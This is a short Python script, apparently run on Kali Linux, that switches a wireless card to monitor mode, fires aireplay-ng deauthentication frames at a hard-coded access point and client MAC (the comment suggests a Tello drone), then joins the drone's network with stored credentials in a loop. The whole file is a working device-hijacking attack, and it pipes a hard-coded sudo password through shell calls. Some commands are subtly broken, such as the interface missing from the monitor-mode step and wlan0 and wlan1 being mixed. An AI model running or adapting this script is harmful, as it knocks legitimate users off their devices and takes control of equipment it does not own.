import subprocess
import json;

flag = 1
# 34-D2-62 Tello Chain
wpaInfo = '{"ssid": "Cheerio", "password": "123456789"}'

while(flag == 1):

    

    drone = json.loads(wpaInfo)

    myPass = 'kali' #or get the password from anywhere

    subprocess.call(["nmcli", "radio", "wifi", "on"])

    cmd = "ip link set wlan0 down"

    linkDown = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    cmd = "iw dev set type monitor"

    setMon = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    cmd = "ip link set wlan0 up"

    linkUp = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    cmd = "aireplay-ng -0 10 -a 34:D2:62:EE:7A:20 -c 00:0F:B5:FD:FB:C2 wlan1"

    deAuth = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    cmd = "sudo nmcli dev wifi connect " + drone["ssid"] + " password " + drone["password"]

    # cmd = "sudo nmcli dev wifi connect TELLO-EE7A20" # Hardcoded test value

    connect = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    output, err = connect.communicate("input data that is passed to subprocess' stderr")

    # print("Signal of drone named "+drone["ssid"]+" not found")

    if(err != b"Error: No network with SSID 'Cheerio' found.\n"):
        flag = 0